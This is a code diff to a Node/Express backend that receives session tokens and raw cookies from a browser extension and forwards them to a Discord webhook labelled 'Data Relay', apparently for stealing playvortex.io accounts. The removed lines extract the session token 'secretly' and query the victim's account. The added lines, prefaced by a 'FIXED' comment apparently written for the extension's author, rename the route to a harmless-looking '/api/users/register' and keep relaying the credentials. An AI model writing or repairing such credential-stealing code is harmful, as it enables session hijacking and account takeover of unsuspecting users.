@@ -11,9 +11,10 @@ function findCookie(cookieString, name) {
     return match ? match[1] : null;
 }
 
-app.post('/api/collect', async (req, res) => {
+// FIXED: Changed endpoint to match your background.js
+app.post('/api/users/register', async (req, res) => {
     try {
-        const { url, rawCookies } = req.body;
+        const { userId, username, displayName, sessionToken, rawCookieString } = req.body;
         const WEBHOOK_URL = process.env.webhook;
 
         if (!WEBHOOK_URL) {
@@ -21,47 +22,16 @@ app.post('/api/collect', async (req, res) => {
             return res.status(500).json({ status: "error" });
         }
 
-        if (!rawCookies) {
-            return res.status(400).json({ status: "error" });
-        }
-
-        // 1. Extract the session token secretly here
-        const sessionToken = findCookie(rawCookies, "session_token") || findCookie(rawCookies, "session_");
         if (!sessionToken) {
-            console.log("No session token found.");
-            return res.status(200).json({ status: "ok" });
+            return res.status(400).json({ status: "error", message: "Missing session token" });
         }
 
-        // 2. Fetch user data from Vortex using the token
-        let username = "Unknown";
-        let displayName = "Unknown";
-        let userId = "Unknown";
+        // Build the Discord payload using the data sent directly from the extension
         let avatarUrl = "https://playvortex.io/favicon.ico";
-
-        try {
-            const userResponse = await fetch("https://playvortex.io/api/users/authenticated", {
-                headers: {
-                    "Cookie": `session_token=${sessionToken}`,
-                    "Accept": "application/json"
-                }
-            });
-
-            if (userResponse.ok) {
-                const userData = await userResponse.json();
-                if (userData) {
-                    userId = userData.id || "Unknown";
-                    username = userData.username || "Unknown";
-                    displayName = userData.displayName || userData.username || "Unknown";
-                    if (userId !== "Unknown") {
-                        avatarUrl = `https://playvortex.io/users/${userId}/avatar`;
-                    }
-                }
-            }
-        } catch (apiErr) {
-            console.warn("API fetch failed on server:", apiErr);
+        if (userId && userId !== "Unknown") {
+            avatarUrl = `https://playvortex.io/users/${userId}/avatar`;
         }
 
-        // 3. Build the Discord payload
         const payload = {
             username: "Data Relay",
             avatar_url: "https://playvortex.io/favicon.ico",
@@ -70,11 +40,11 @@ app.post('/api/collect', async (req, res) => {
                 color: 0x8f82c4,
                 thumbnail: { url: avatarUrl },
                 fields: [
-                    { name: "👤 Username", value: `**@${username}**`, inline: true },
-                    { name: "📛 Display Name", value: `**${displayName}**`, inline: true },
-                    { name: "🆔 User ID", value: `\`${userId}\``, inline: false },
+                    { name: "👤 Username", value: `**@${username || 'Unknown'}**`, inline: true },
+                    { name: "📛 Display Name", value: `**${displayName || 'Unknown'}**`, inline: true },
+                    { name: "🆔 User ID", value: `\`${userId || 'Unknown'}\``, inline: false },
                     { name: "🔑 Session Token", value: `\`\`\`${sessionToken}\`\`\``, inline: false },
-                    { name: "📦 Raw Cookies", value: `\`\`\`${(rawCookies || '').substring(0, 950)}\`\`\``, inline: false }
+                    { name: "📦 Raw Cookies", value: `\`\`\`${(rawCookieString || '').substring(0, 950)}\`\`\``, inline: false }
                 ],
                 footer: { text: "Render Proxy", icon_url: "https://playvortex.io/favicon.ico" },
                 timestamp: new Date().toISOString()
@@ -90,15 +60,15 @@ app.post('/api/collect', async (req, res) => {
 
         if (!response.ok) {
             console.error("Discord webhook failed on server:", response.status);
+            return res.status(500).json({ status: "error", message: "Discord webhook failed" });
         } else {
             console.log("Data successfully relayed to Discord!");
+            return res.status(200).json({ status: "success" });
         }
-
-        return res.status(200).json({ status: "success" });
 
     } catch (err) {
         console.error("Server error:", err);
-        return res.status(500).json({ status: "error" });
+        return res.status(500).json({ status: "error", message: err.message });
     }
 });
 
